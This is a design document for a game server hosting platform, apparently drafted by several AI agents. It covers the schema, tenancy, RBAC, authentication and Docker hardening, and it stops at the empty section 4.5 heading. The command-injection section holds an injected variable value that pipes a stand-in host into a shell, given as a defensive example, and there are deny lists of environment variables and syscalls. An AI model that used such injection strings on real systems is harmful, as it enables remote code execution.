# PXHost — Game Server Hosting Platform: Architecture v1

> Status: **approved design, pending implementation**. Own codebase, conceptually inspired by Pterodactyl/Wings (reference instance inspected: `dogbrx.ddns.net`, Pterodactyl 1.14.1). Repo was empty at design time.
>
> Contributors to this design: Architect/PO agent (domain, DB, RBAC, roadmap), Back-End agent (NestJS API), Node Agent agent (Go + Docker), Front-End agent (React panel), QA agent (test & security strategy). Consolidated by the orchestrator.

## 0. Locked decisions

| Area | Choice |
|---|---|
| Node Agent | Go, no cgo, static binary |
| Backend/API | NestJS + TypeScript, Fastify adapter |
| Panel | React + TypeScript + Vite + TailwindCSS |
| Database | PostgreSQL 17+ (target 18 for native `uuidv7()`) |
| Cache/queues/pubsub | Redis (BullMQ) |
| ORM | Prisma |
| Code/docs | English. UI strings: PT-BR via i18n (i18next), structured for more locales later |
| Dev node | Dedicated Linux VM with Docker (host-only network to the Windows dev box) |
| Panel↔Agent transport | HTTPS/JSON + mTLS (not gRPC); browser↔agent WebSocket direct (not proxied) |
| Agent auth (browser/API→agent) | Ed25519-signed short-lived JWTs, verified **offline** by the agent |
| Agent auth (agent→panel) | Opaque node token (argon2id-hashed) + mTLS client cert |

**Reference instance findings** (validates this design): Wings listens on `:8080`, SFTP on `:2022`, data at `/var/lib/pterodactyl/volumes`, `upload_limit: 100`, `allowed_mounts: []` by default, Let's Encrypt cert on the node FQDN. Client area tabs: Console, Files, Databases, Schedules, Users, Backups, Network, Startup, Settings, Activity. The reference panel displayed its Wings daemon token in cleartext in the admin UI — **PXHost never does this**: tokens are argon2id-hashed at rest and shown once, at creation only.

## 1. Topology

```
Browser (customer/admin)
   |  HTTPS (REST, bearer access token in memory)
   v
React Panel (static)
   |  HTTPS
   v
NestJS API  ---- PostgreSQL (RLS-scoped)
   |  |           +-- Redis (sessions/denylist, rate limits, BullMQ)
   |  |
   |  +-- mTLS + node token --> Go Node Agent --> Docker Engine API --> game container
   |
   +-- mints short-lived Ed25519 JWT --> Browser --WSS direct--> Go Node Agent
                                          (console, stats, file up/download)
```

Multi-node from day one: one Panel/API, N independent nodes, each running its own agent, registered via a single-use bootstrap token and its own mTLS client certificate.

---

## 2. Domain Model & PostgreSQL Schema

### 2.1 Bounded contexts

| Context | Tables |
|---|---|
| Identity | `users`, `sessions`, `api_keys`, `permission_catalog` |
| Infrastructure | `locations`, `nodes`, `node_tokens`, `allocations`, `mounts` (+ join tables) |
| Catalog | `template_groups` (nests), `server_templates` (eggs), `template_variables`, `plans` |
| Provisioning | `servers`, `server_variables`, `server_transfers` |
| Server services | `backups`, `databases`, `database_hosts`, `schedules`, `tasks`, `subusers` |
| Observability | `activity_logs`, `audit_logs` (partitioned), `server_metrics_1m` (partitioned) |

Key design calls:
- **One `users` table.** `global_role` (`root_admin|admin|support|user`) distinguishes staff from customers — no parallel admin login system.
- **`permission_catalog` is data, not code** — adding a permission string is a migration, not a frontend release.
- **`server_templates` ("eggs")** hold the docker image set, `startup_command` with `{{VAR}}` placeholders, install script, config rewrite rules and log-based "ready" detection — this is what makes the platform multi-game without code changes.
- **`audit_logs` is separate from `activity_logs`**: the former is an append-only security trail (`REVOKE UPDATE, DELETE`, monthly partitions), the latter is the customer-facing feed.
- **Snapshot, not reference:** `servers` copies its limits from `plans` at creation time (`plan_id` kept for billing/drift only). Editing a plan never silently resizes running containers; admins get a drift report and an explicit "apply to N servers" job with dry run.

### 2.2 Keys & types

| Choice | Where | Why |
|---|---|---|
| `uuid PK DEFAULT uuidv7()` | anything in a URL/agent payload | non-enumerable, time-ordered -> no B-tree index bloat |
| `bigserial PK` | `allocations`, `*_variables`, logs, metrics | high-volume, always reached via a parent UUID |
| `char(8) short_id` on `servers` | container name, SFTP username | UUIDs are unusable as container/shell identifiers |
| `text + CHECK` instead of native `ENUM` | all status columns | 1:1 with TS string unions; transactionally migratable |

Soft delete (`deleted_at` + partial unique indexes) on `users`, `nodes`, `server_templates`, `plans`, `locations`, `database_hosts`. **`servers` are hard-deleted** once the agent confirms teardown (never soft — ghosts would inflate disk/allocation quotas).

### 2.3 Core DDL (abridged — full statements in the implementation PR)

```sql
CREATE TABLE users (
  id uuid PRIMARY KEY DEFAULT uuidv7(),
  email citext NOT NULL, username citext NOT NULL,
  password_hash text NOT NULL,               -- argon2id
  global_role text NOT NULL DEFAULT 'user'
    CHECK (global_role IN ('root_admin','admin','support','user')),
  admin_permissions text[] NOT NULL DEFAULT '{}',
  totp_secret_enc bytea, recovery_codes_enc bytea,
  language text NOT NULL DEFAULT 'pt-BR', timezone text NOT NULL DEFAULT 'America/Sao_Paulo',
  is_active boolean NOT NULL DEFAULT true,
  failed_logins smallint NOT NULL DEFAULT 0, locked_until timestamptz,
  created_at timestamptz NOT NULL DEFAULT now(), deleted_at timestamptz
);

CREATE TABLE nodes (
  id uuid PRIMARY KEY DEFAULT uuidv7(),
  location_id uuid NOT NULL REFERENCES locations(id),
  fqdn text NOT NULL, daemon_port integer NOT NULL DEFAULT 8443,
  memory_total_mb integer NOT NULL, memory_overallocate_pct integer NOT NULL DEFAULT 0,
  disk_total_mb integer NOT NULL, disk_overallocate_pct integer NOT NULL DEFAULT 0,
  cpu_overallocate_pct integer NOT NULL DEFAULT -1,        -- -1 = unlimited (CPU is time-shared)
  health_status text NOT NULL DEFAULT 'unknown'
    CHECK (health_status IN ('unknown','online','degraded','offline')),
  last_heartbeat_at timestamptz, deleted_at timestamptz
);

CREATE TABLE servers (
  id uuid PRIMARY KEY DEFAULT uuidv7(), short_id char(8) NOT NULL,
  owner_id uuid NOT NULL REFERENCES users(id) ON DELETE RESTRICT,
  node_id uuid NOT NULL REFERENCES nodes(id) ON DELETE RESTRICT,
  template_id uuid NOT NULL REFERENCES server_templates(id) ON DELETE RESTRICT,
  plan_id uuid REFERENCES plans(id) ON DELETE SET NULL,
  docker_image text NOT NULL, startup_command text NOT NULL,
  -- limits: SNAPSHOT of the plan at creation time
  cpu_limit_percent integer NOT NULL DEFAULT 100, memory_mb integer NOT NULL,
  swap_mb integer NOT NULL DEFAULT 0, disk_mb integer NOT NULL,
  max_databases integer NOT NULL DEFAULT 0, max_backups integer NOT NULL DEFAULT 0,
  max_allocations integer NOT NULL DEFAULT 1, max_schedules integer NOT NULL DEFAULT 5,
  -- status = PANEL-authoritative provisioning lifecycle
  status text NOT NULL DEFAULT 'installing'
    CHECK (status IN ('installing','install_failed','ready','suspended',
                       'restoring_backup','transferring','deleting')),
  -- power_state = AGENT-authoritative runtime state (Redis is the live truth; this is a lagging cache)
  power_state text NOT NULL DEFAULT 'offline'
    CHECK (power_state IN ('offline','starting','running','stopping','crashed')),
  created_at timestamptz NOT NULL DEFAULT now(), updated_at timestamptz NOT NULL DEFAULT now()
);
CREATE UNIQUE INDEX servers_short_id_uq ON servers (short_id);
ALTER TABLE servers ADD CONSTRAINT servers_suspension_consistency
  CHECK ((status = 'suspended') = (suspended_at IS NOT NULL));
```

Full v1 also defines: `sessions`, `api_keys`, `permission_catalog`, `locations`, `node_tokens`, `allocations` (with a partial unique index enforcing one primary allocation per server), `mounts` + join tables, `template_groups`, `server_templates`, `template_variables`, `plans`, `server_variables`, `subusers` (with a trigger forbidding the owner from being their own subuser), `backups`, `database_hosts`, `databases`, `schedules`, `tasks`, `server_transfers`, `activity_logs`, `audit_logs` (RANGE-partitioned by month), `server_metrics_1m` (RANGE-partitioned).

### 2.4 Tenancy — cross-customer reads must be impossible

Three mandatory layers:

1. **Single ownership edge.** Every tenant row reaches a user via exactly one path: `servers.owner_id` or `subusers(server_id, user_id)`. Children carry `server_id` with `ON DELETE CASCADE`.
2. **Repository-level scoping.** Client-scope repositories require a resolved `ServerContext` as their first argument — a missing scope is a compile error, not a runtime IDOR.
3. **Row-Level Security as the backstop.** The API connects as `app_user` (never the migration owner), does `SET LOCAL app.user_id` / `app.is_admin` per request:

```sql
CREATE FUNCTION can_access_server(p_server uuid) RETURNS boolean
LANGUAGE sql STABLE SECURITY DEFINER AS $$
  SELECT coalesce(current_setting('app.is_admin', true) = 'on', false)
      OR EXISTS (SELECT 1 FROM servers s WHERE s.id = p_server AND s.owner_id = current_app_user())
      OR EXISTS (SELECT 1 FROM subusers su WHERE su.server_id = p_server
                  AND su.user_id = current_app_user() AND su.accepted_at IS NOT NULL);
$$;
ALTER TABLE servers ENABLE ROW LEVEL SECURITY;
CREATE POLICY servers_tenant ON servers USING (can_access_server(id));
-- identical policies on backups, databases, schedules, server_variables, subusers, activity_logs
```

A forgotten `WHERE owner_id = ?` or a SQL injection returns **zero rows**, not another customer's data.

### 2.5 RBAC — two independent axes

| Axis | Storage | Question |
|---|---|---|
| Global role | `users.global_role` + `users.admin_permissions text[]` (only narrows the role, never widens) | "Can you touch the admin surface, and which part?" |
| Server permission | ownership or `subusers.permissions text[]` (GIN-indexed) | "On *this* server, can you do *this*?" |

They never mix — admin actions go through the admin surface and are separately audited, so "support opened the file manager" is visible instead of indistinguishable from the owner.

Permission groups: `control.*` (console/start/stop/restart/kill), `user.*`, `file.*`, `backup.*`, `allocation.*`, `startup.*`, `database.*`, `schedule.*`, `settings.*`, `activity.read`, `websocket.connect`.

Resolution order (fixed, short-circuiting): `authenticated -> global role -> tenancy -> permission key -> server status gate -> node health gate -> quota gate`. **Unauthorized server access returns 404, never 403** — never confirm another tenant's server exists. Resolved permission sets are cached in Redis (`perm:{user}:{server}`, 60s TTL, invalidated on subuser/suspension/role change).

Gating table (abridged):

| Condition | Blocks | Allows |
|---|---|---|
| `suspended` | `control.*`, file writes, backup create/restore, DB writes, schedules, SFTP | reads, backup download, admin unsuspend |
| `installing`/`restoring_backup`/`transferring` | everything mutating, incl. power | status polling, install/restore log stream |
| node offline/maintenance | anything needing the agent -> `503 NODE_UNAVAILABLE` | pure-DB reads |
| node offline + schedule due | run is **skipped**, never queued indefinitely | — |

Suspension is enforced **twice**: once by the API, once by the agent itself (`is_suspended` pushed in the server config; the agent refuses `start` even if the panel is compromised or lagging).

### 2.6 Plans & node capacity

Plan fields map directly onto container limits (`cpu_limit_percent->CpuQuota`, `memory_mb->Memory`, `swap_mb->MemorySwap`, `oom_kill_enabled->OomKillDisable` inverted) plus panel-side quotas (`max_databases`, `max_backups`, `max_allocations`, `max_schedules`, `backup_retention_days`).

Node capacity is checked **inside the create transaction**, under `pg_advisory_xact_lock('node:'||node_id)`, so two concurrent creates cannot both pass the same check. Defaults: memory and disk **strict** (`overallocate_pct = 0`), CPU **unlimited** (`-1`, since CPU is time-shared and blocking sales on nominal sums wastes hardware). Auto-deploy spreads load (lowest max-usage-ratio node), never bin-packs.

#### 2.6.1 Subscriptions — the commercial layer on top of Plans

`subscriptions` is the commercial contract between a customer and a plan — deliberately separate from `servers.plan_id`, which exists purely for the snapshot-not-reference billing/drift doctrine (§2.1). A subscription can exist with no server yet (`server_id IS NULL`, the only state this milestone ever produces — see below) and a server can exist with no subscription (an admin still creating one directly, the pre-existing path). The two connect only through the optional, unique `subscriptions.server_id`.

Lifecycle: `pending -> active -> {past_due, suspended, cancelled, expired}`, with `active`/`past_due`/`suspended` able to recover back to `active`. `cancelled`/`expired` are terminal. **Only an admin can move a subscription into `active`** (`POST /api/admin/subscriptions/:id/status`) — there is no payment gateway yet (§9 below), so this is deliberately a manual gate, not a mock. A customer's own self-service action is limited to cancelling (`pending`/`active`/`past_due`/`suspended` -> `cancelled`).

**Vagas (commercial stock) now count two disjoint sources**, added together: servers on the plan (`status <> 'deleting'`, unchanged from §2.6) plus subscriptions on the plan that are `pending`/`active`/`past_due`/`suspended` AND have no server yet. A subscription and its eventual server can never double-count the same slot — the moment a subscription is attached to a server, it drops out of the second term. This closes the hole where a plan could otherwise be oversold entirely through subscriptions, never actually creating a server.

The public catalog (`GET /api/public/plans[/:slug]`, no auth) never exposes a raw slot count or anything node-shaped — only a computed `availability: { status: 'available'|'limited'|'sold_out', remaining }`, derived purely from the occupancy accounting above (`maxSlots` vs. occupied). Deliberately NOT also gated on whether a node currently exists to run the plan — found live, against a dev database with plans but zero nodes bootstrapped, that conflating "commercially full" with "not deployed yet" makes every plan read as sold out on a fresh install, and this milestone never provisions a server at subscribe time anyway (a `pending` subscription waits on an admin regardless of node state). Node fit belongs to the future auto-provisioning flow, not to what a visitor sees today. Cached 30s in Redis, invalidated on any plan create/update/remove.

**Auto-provisioning is explicitly out of scope for this milestone.** An `active` subscription does not create a server — an admin still does that by hand, the same as before subscriptions existed. `subscriptions.server_id` is the seam a future milestone hooks into (payment webhook -> `active` -> node selection -> `ServersService.create` -> attach `server_id`), listed in §8's roadmap but not built.

### 2.7 Server lifecycle — two orthogonal state machines

`servers.status` (panel-authoritative, provisioning) and `servers.power_state` (agent-authoritative, runtime) are **deliberately separate columns** — conflating them cannot represent "suspended while still draining players". Redis holds the live power-state truth; Postgres is a lagging cache for list views.

```
status:  installing -> ready <-> suspended
             | (fail)         \-> restoring_backup / transferring -> ready
        install_failed -> (reinstall) -> installing
        any -> deleting -> (row hard-deleted)

power_state:  offline -> starting -> running -> stopping -> offline
                            |                     |
                         crashed <- unexpected exit    kill -> offline
```

`starting->running` is decided by the template's log "ready" marker with a fallback timeout. Crash auto-restart has a circuit breaker (max 3 restarts / 60s). **The agent only reports power_state, never requests a status transition.**

---

## 3. Backend API (NestJS)

### 3.1 Module map

`AuthModule` (login/2FA/refresh/API keys) - `AuthorizationModule` (`ServerAccessService` — the single chokepoint every server route goes through) - `UsersModule` - `ServersModule` (lifecycle, config rendering, power, startup vars, allocations) - `NodesModule` (CRUD, bootstrap/CA, health, `AgentClient`) - `PlansModule` - `FilesModule` (small ops proxied; transfers via signed direct URLs) - `BackupsModule` (local/S3 driver interface) - `DatabasesModule` - `SchedulesModule` (cron + dispatcher) - `AdminModule` - `AuditModule` - `WebsocketGatewayModule` (mints agent capability tokens; **not** the console transport) - `AgentCallbacksModule` (`/api/remote/*`, agent-only) - `HealthModule`.

### 3.2 API surface (v1, representative — full table in the implementation PR)

Three surfaces: `/api/client/*` (customer, scoped via `ServerAccessService`), `/api/admin/*` (staff, role+permission guarded, 2FA-gated for destructive ops), `/api/remote/*` (agent only, mTLS + node token, never accepts a user JWT).

Envelope: `{ data, meta: { page, perPage, total, totalPages } }` for lists; errors `{ code: "SCREAMING_SNAKE", message, status, correlationId, details }`. Client area covers auth (login/2FA/refresh/logout/API keys/sessions), server CRUD + power + console-token mint + resources snapshot, files (list/contents/write/rename/delete/compress/decompress/chmod/upload/download via signed URLs), backups (create/list/download/restore/lock/delete), databases, schedules+tasks, subusers. Admin covers nodes (incl. bootstrap-token issuance and config preview), allocations, plans, users, servers (build/suspend/transfer/delete), audit log, database hosts, eggs/nests import-export. Remote covers node bootstrap/heartbeat/config pull, server config/install fetch, install/status/backup/transfer callbacks, and the public JWKS endpoint agents use for offline JWT verification.

### 3.3 Authentication & authorization

- **Passwords:** argon2id (64 MiB, t=3, p=2), rehash-on-login when params drift, breached-password check at signup/change, uniform-timing dummy verify on unknown emails.
- **Sessions:** access JWT (HS512, 15 min, in-memory only in the panel) + refresh token (opaque, cookie `HttpOnly Secure SameSite=Lax __Host-` prefixed, 14 days, hash-only stored). **Rotation with reuse detection**: presenting an already-used refresh token revokes the entire token family and forces re-login. Revocation via a Redis `denylist:jti/sid` (TTL <= access-token lifetime) plus `users.tokens_valid_after` as a belt-and-suspenders check.
- **2FA:** TOTP (SHA-1, 6 digits, +/-1 step drift), encrypted-at-rest secret, 10 single-use argon2id-hashed recovery codes. Step-up (`Bearer+2FA`) required for destructive actions (password change, API key creation, admin 2FA-disable, server delete, backup restore).
- **Personal API keys:** `pnl_<16-char id>_<48-char secret>`, only the argon2id hash stored, scopes intersected with the owner's live permissions (never exceed them), optional IP allowlist, never valid on `/api/admin/*`.
- **Server permission model:** as in §2.5, shared via a generated `permissions.json` consumed by both the API and the panel.

### 3.4 Panel <-> Agent trust model (three independent layers)

1. **mTLS**, both directions, off an internal CA (`panel-agent-ca`, Ed25519 root). Agent presents `CN=node-<uuid>`; API presents a client cert the agent verifies against the same CA.
2. **Per-node opaque token** (`<id>.<secret>`, argon2id-hashed), sent as a bearer on every `/api/remote/*` call — defends against a proxy that drops mTLS.
3. **Short-lived Ed25519 JWTs for browser->agent capabilities** (console connect, file download, file upload). Verified **fully offline** by the agent against a JWKS it caches and refreshes every 5 minutes.

```ts
interface AgentCapabilityToken {
  iss: 'panel'; aud: 'node:<uuid>'; sub: '<server-uuid>'; jti: string;
  uid: string; cap: 'ws' | 'file.download' | 'file.upload';
  permissions: string[];             // e.g. ['websocket.connect','control.console']
  ctx?: { path?: string; maxBytes?: number };
  iat: number; exp: number; nbf: number;      // ws: +600s | download: +60s (single-use) | upload: +900s (single-use)
}
```

Console tokens are **not** single-use (long-lived socket): at T-60s the agent sends `token:expiring`, the browser re-fetches and re-`auth`s over the **same** socket — so revoking a subuser takes effect within <=10 minutes with zero agent<->panel round trip. Download/upload tokens **are** single-use, burned via a `jti` set. Key rotation: signing keys carry `next/current/retiring` states, published in the JWKS 24h before promotion, retired 24h after — emergency rotation is paired with a broadcast "reject tokens with `iat < T`" to every agent.

### 3.5 Panel <-> Agent communication

**Inversion of control:** the Panel never pushes bulk state — for anything list-shaped, the agent *pulls* from `/api/remote/*`. This keeps the Panel's outbound surface tiny and makes agent restarts self-healing. Panel->Agent calls: create/power/command/patch-limits/reinstall/delete/suspend/file-small-ops/backup/transfer, all idempotent, all behind a per-node circuit breaker (opens after 5 consecutive failures, 30s cooldown). Agent->Panel callbacks: install result, status change, backup/restore result, transfer result, batched activity, heartbeat (every 15-30s) — all idempotent via a client-supplied idempotency key.

**Console/stats — direct browser<->agent WebSocket**, not proxied:
1. `GET /api/client/servers/:id/websocket` -> `{ token, socket: "wss://node.fqdn:8443/...", expiresAt }`.
2. Browser opens the socket, sends `{"event":"auth","data":{"token":...}}`.
3. Agent replies `auth:ok` + last ~100 buffered lines + first stats frame.
4. `console:output` streamed as produced; `stats` every 2s; `token:expiring` before expiry.

NAT/private nodes get an explicit **relay fallback** (`relayMode: true`) where the API proxies the WS over its own mTLS tunnel to the agent — documented as non-scaling, off by default.

**Node health:** heartbeat-derived `online` (<45s) / `degraded` (45-120s) / `offline` (>120s), swept by a leader-locked job every minute. Offline nodes: reads still work from cache, live/mutating actions return `409 NODE_UNAVAILABLE` immediately (no hanging spinners), queued jobs back off up to 6h then dead-letter with an admin alert, and on recovery the agent's heartbeat carries authoritative `serverStates` that the panel reconciles against (**agent wins on runtime state, panel wins on configuration**).

### 3.6 Security controls

- **Input validation:** global `ValidationPipe({whitelist:true, forbidNonWhitelisted:true, transform:true})`; a dedicated `@IsSafePath()` validator (defense-in-depth only — the agent's jail is the real boundary); response DTOs are explicit allowlists via `ClassSerializerInterceptor`.
- **Rate limits (Redis-backed, per IP+email or per user):** login 5/5min/email, refresh 30/hr, power 10/min/server + one in-flight lock per server, console commands 60/min, backup-create 3/hr + one running backup per server, agent callbacks 1200/min/node.
- **IDOR prevention:** structural — no controller may reach a server except via `ServerAccessService.resolve()`; nested resources are always joined to their parent in the same query; a lint rule bans direct `prisma.server.findUnique/findFirst` outside the servers repository module.
- **SSRF defenses (`SafeUrlService`):** scheme allowlist, DNS-then-validate-every-record against a private/link-local/metadata deny list, **pin the resolved IP and dial it directly** (defeats DNS rebinding), zero redirects, applied to node FQDNs, database-host addresses, backup/webhook targets, and the file-manager "import from URL" feature.
- **Secrets:** Zod-validated env schema at boot (refuse to start on any missing var); AES-256-GCM envelope encryption with per-record AAD binding (`table:column:rowUuid`) so ciphertext can't be moved between rows; encrypted at rest: node tokens (hash-only, actually — never re-displayed), TOTP secrets, DB passwords, CA/signing private keys; a pino redaction list plus a `SecretString` branded type so an accidental log call is inert.
- **Headers/CORS:** `helmet` + HSTS, exact-origin CORS allowlist with credentials, refresh cookie is the only cookie and is CSRF-defended by `SameSite=Lax` + a custom header + `Origin` check.
- **Audit log:** append-only (`REVOKE UPDATE, DELETE` enforced by grant + trigger), monthly partitions, records every auth event, server mutation/power action, admin write, admin access to a customer's server, node bootstrap/token rotation, and permission grant.

### 3.7 Background work (BullMQ)

Separate Redis DB from cache. Queues: `server.install/delete/transfer`, `backup.create/restore/prune`, `schedule.tick` (single leader, `pg_advisory` / Redis lock, `SELECT ... FOR UPDATE SKIP LOCKED`) + `schedule.dispatch`, `node.sync`, `audit.write`, `mail`. Every job has a **deterministic idempotent `jobId`** (e.g. `schedule:<id>:<plannedRunAtEpoch>`) so BullMQ's at-least-once delivery can never double-run a schedule even across a leader flap. Node-unreachable errors get a longer backoff ladder (1m->5m->15m->1h->6h) instead of burning retries in 90 seconds. Workers run as a separate process (`start:worker`) from the API so a slow backup job never touches request latency.

### 3.8 API repo structure (top level)

```
apps/api/
+-- prisma/schema.prisma, migrations/, seed.ts
+-- src/core/{prisma,redis,crypto,logger,http,filters,interceptors}
+-- src/modules/{auth,authorization,users,servers,nodes,plans,files,
|                backups,databases,schedules,eggs,admin,audit,websocket,remote,health}
+-- src/queues/
+-- src/contracts/           # generated: permissions.json, error-codes.json, openapi.json
+-- test/{integration,e2e}
```

---

## 4. Node Agent (Go)

### 4.1 Non-negotiable stances

| Decision | Choice | Why |
|---|---|---|
| Transport | HTTPS/JSON + WSS, no gRPC | one JSON toolchain for TS<->Go; all streaming is Agent->Browser or Agent->Panel |
| State | In-memory, rebuilt from Docker labels on boot | no DB on the node; labels are the durable store |
| Filesystem jail | `openat2(2)` + `RESOLVE_BENEATH\|RESOLVE_NO_MAGICLINKS\|RESOLVE_NO_XDEV` over a held root **dirfd** | the only TOCTOU-free answer; string-cleaning (`filepath.Clean`) is not a security boundary |
| Container identity | unique host uid/gid per server (100000-165535), allocated by the panel | DAC isolation between customers even if a mount is misconfigured |
| Networking | one node-wide bridge, `enable_icc=false` + `DOCKER-USER` egress ACL | per-server networks don't scale (bridge/iptables cost, address-pool exhaustion) for the same isolation `icc=false` already gives |
| Disk quota v1 | software accounting + read-only rootfs + capped tmpfs/log driver; **XFS project quotas in phase 2** | `--storage-opt size=` quotas the writable layer, which is the wrong target — real data lives in the bind mount |
| Command construction | **tokenize-then-substitute, never shell-interpolate** | the single most important line of defense against command injection |
| Docker socket | never mounted into any container, hardcoded rejection of any mount resolving to a socket path | mounting it is equivalent to host root |
| Container spec builder | a **pure function** `BuildContainerSpec(server, template, node) -> (Config, HostConfig, NetworkingConfig)` | turns the platform's most critical invariants (no-priv, caps dropped, no host mounts, no host network) into 2-second unit tests instead of a 6-minute nightly Docker job — **QA's highest-leverage request, adopted** |

### 4.2 Module layout

```
agent/
+-- cmd/pxagent/main.go
+-- internal/
|  +-- config/           # YAML load + fail-closed validation, bootstrap flow
|  +-- auth/              jwt.go (offline Ed25519 verify), replay.go (jti cache), nodetoken.go
|  +-- api/                http server, router, WS upgrade
|  +-- dockerx/            client wrapper, digest-pinned pulls, event stream
|  +-- spec/               container.go / hostconfig.go / env.go / argv.go / mounts.go / seccomp.go
|  +-- srv/                manager.go (registry+reconciliation), server.go (state machine), power.go, install.go, crash.go
|  +-- fsx/                jail.go, ops.go, upload.go, archive.go, quota.go
|  +-- console/            attach.go, ring.go, hub.go, input.go
|  +-- stats/              collector.go, frame.go
|  +-- backup/             local.go, restore.go, ignore.go, provider.go (interface, S3 later)
|  +-- netpolicy/          bridge.go, firewall.go (DOCKER-USER + INPUT reconciliation)
|  +-- panel/              client.go, callbacks.go, safedial.go (SSRF-safe outbound dialer)
|  +-- jobs/                local scheduler (heartbeat, quota walk, image prune, cert renewal)
|  +-- limits/              token buckets
+-- configs/{seccomp-pxhost.json, apparmor-pxhost-server, pxagent.service}
+-- hack/{fakepanel/, attack/}
```

Six long-lived goroutine families under one cancellable root context: HTTP/WS server, Docker event listener (single stream, full reconciliation sweep on every reconnect), per-running-server stats collector, per-running-server console pump, a ticker-driven local job scheduler, and a bounded/retrying panel-callback dispatcher. One mutex per `*Server` serializes all Docker calls for that server; no global lock is ever held during a Docker call.

### 4.3 Container security spec (the load-bearing section)

```go
// container.Config (essentials)
User:       "100042:100042"        // unique per-server uid:gid, never root
WorkingDir: "/home/container"
Tty:        false                  // TTY would merge stderr/stdout and enable escape-sequence injection
Entrypoint: argv                   // []string, NEVER "sh -c <interpolated string>"
Healthcheck: {Test: []string{"NONE"}}  // a template-supplied healthcheck is another exec surface

// container.HostConfig (essentials)
Privileged:      false
NetworkMode:     "pxhost0"
PidMode/IpcMode/UTSMode/UsernsMode/CgroupnsMode: all container-private, never host-shared
ReadonlyRootfs:  true
Tmpfs:           {"/tmp": "size=64m,noexec,nosuid,nodev", "/run": "size=8m,noexec,nosuid,nodev"}
SecurityOpt:     ["no-new-privileges:true", "seccomp=<hardened-profile>", "apparmor=pxhost-server"]
CapDrop:         ["ALL"]
CapAdd:          []                // intentionally empty
Mounts:          [{bind: <data-dir>/<uuid> -> /home/container, NonRecursive: true, RPrivate}]
RestartPolicy:   {Name: "no"}      // the AGENT owns crash-restart decisions, not Docker
LogConfig:       {Type: "local", Config: {"max-size":"8m","max-file":"3"}}
Resources: {
  Memory, MemoryReservation: 0.9xMemory, MemorySwap == Memory (swap disabled), MemorySwappiness: 0,
  OomKillDisable: false,           // ALWAYS false -- a frozen cgroup on OOM is a node-wide outage waiting to happen
  CPUPeriod: 100000, CPUQuota: percentx1000,
  BlkioWeight: 500, PidsLimit: 512,
  Ulimits: [nofile 8192, nproc 512, core 0, memlock 0],
}
```

**Capabilities:** drop `ALL`, add nothing — no `SYS_ADMIN`, `NET_ADMIN`, `SYS_PTRACE`, `SYS_MODULE`, `DAC_READ_SEARCH`, ever. **Seccomp:** Docker's default profile plus explicit denial of `ptrace`, `process_vm_read/writev`, `userfaultfd`, the whole `io_uring_*` family (a known seccomp-bypass vector via kernel worker context), `mount_setattr`/`fsopen`/`fsconfig`/`open_tree`/`move_mount`, `bpf`, `perf_event_open`, and `clone`/`unshare` with any `CLONE_NEW*` flag. **AppArmor:** a `pxhost-server` profile derived from `docker-default` adding `deny mount`, `deny ptrace`, `deny /proc/*/mem rw`, `deny network raw`. The agent **fails closed** — refuses to start any container if the AppArmor profile isn't loaded in the kernel or the seccomp JSON doesn't parse.

**Image policy:** panel-supplied only, must match a configured registry-prefix allowlist, and — when `require_digest_pin: true` (default) — must be `@sha256:...` pinned; the agent re-verifies the pulled image's digest against the request before creating the container. Tag resolution to a digest is a **contract requirement on the panel** at template-save time.

**Command construction (the injection defense):** the template's startup string is tokenized **once, at spec-build time** (admin-authored, shell-like word splitting with quote handling). Customer-supplied variable values are substituted **inside already-fixed tokens**, so `SERVER_JARFILE = "x.jar; curl evil|sh"` becomes one literal (harmless) argv element — no shell ever parses it. `Entrypoint` is always an argv array; `argv[0]` may never be `sh`/`bash`/`env`/`eval`. The same tokenize-then-substitute rule (with the shell layer isolated to a *constant*, non-interpolated `install.sh` invocation) governs the install container.

**Env var handling:** allowlist = the template's declared variables only; hardcoded rejection of `LD_PRELOAD`/`LD_LIBRARY_PATH`/`*_OPTIONS`/`BASH_ENV`/`IFS`/`PYTHONPATH` and friends; key regex `^[A-Z][A-Z0-9_]{0,63}$`; values reject NUL/newline, capped length, passed through byte-for-byte since they never reach a shell.

**Networking:** one bridge (`pxhost0`, `enable_icc=false`), verified at boot by inspecting the actual kernel-level forwarding rule (not just the Docker object). `DOCKER-USER` chain (evaluated before Docker's own accept rules, survives daemon restarts) drops container<->container forwarding and blocks egress to `169.254.0.0/16` (cloud metadata/IMDS) and all RFC1918 ranges. **Separately**, an `INPUT` chain rule is required to stop a container reaching the *host's own* listening ports (including the agent's own control API) via the bridge gateway IP — `DOCKER-USER` alone does not cover this, since host-bound traffic is `INPUT`, not `FORWARD`. The agent additionally binds its control API to the node's management IP, never `0.0.0.0`, as a second layer. Same-port host<->container mapping is used everywhere (no NAT remapping) because game protocols embed the port in server-list/query responses.

**Volumes:** one bind mount per server, `<data>/<uuid> -> /home/container`, `NonRecursive`, `RPrivate`; source is resolved through the same jail as file operations before being handed to Docker, so a panel bug or compromise can't traverse `../..` into an arbitrary host path. Admin-defined extra mounts are validated against a **node-local** allowlist (never panel-supplied), exact-path match only (no globbing — prefix matching plus symlinks is an escape), forced read-only where configured. Any mount resolving to a socket path or under `/proc`, `/sys`, `/dev`, `/run`, `/etc` is hardcoded-rejected.

### 4.4 Filesystem jail (path traversal & symlink escape)

Root held as an `O_PATH|O_DIRECTORY` dirfd, opened once at server registration. Every operation resolves relative to that fd via `openat2(RESOLVE_BENEATH|RESOLVE_NO_MAGICLINKS|RESOLVE_NO_XDEV)` — this makes the **kernel** the enforcement point, closing the classic check-then-use TOCTOU window (verified by a 1000-iteration parallel symlink-swap race test). `RESOLVE_NO_MAGICLINKS` blocks `/proc/self/fd/*`-style bypasses; `RESOLVE_NO_XDEV` blocks crossing into an unexpected mount. Kernel >=5.6 is a hard preflight requirement — every target distro (Debian 12+, Ubuntu 22.04+, RHEL 9+) satisfies it, so the string-based fallback is treated as dead code, not shipped as a real path.

Lexical `sanitize()` still runs first (reject `..` components, NUL bytes, non-UTF-8, overlong paths/components, denied basenames after NFC normalization) — not as the security boundary, but so a rejected request gets a clean error instead of an opaque kernel errno.

**Archives (zip-slip/decompression bombs):** every entry name goes through the same jail resolution before being written; symlink and hardlink entries are skipped and reported, never followed; setuid/setgid/sticky bits are stripped from every extracted mode; three independent caps (max uncompressed bytes, max entry count, max compression ratio evaluated continuously past 1 MiB) bound extraction via `io.LimitedReader`, backstopped by the same disk quota check as any other write.

**Ownership:** every agent-created file is opened `0600`, immediately `fchownat`'d to the server's uid (before any data is written), then set to its final mode — the short window contains only an empty, unreadable-by-others file. Uploads/downloads use signed, single-use, short-TTL (60s download / 15min upload) Ed25519 JWTs so the panel never proxies large transfers.

### 4.5 Console, stats, backups

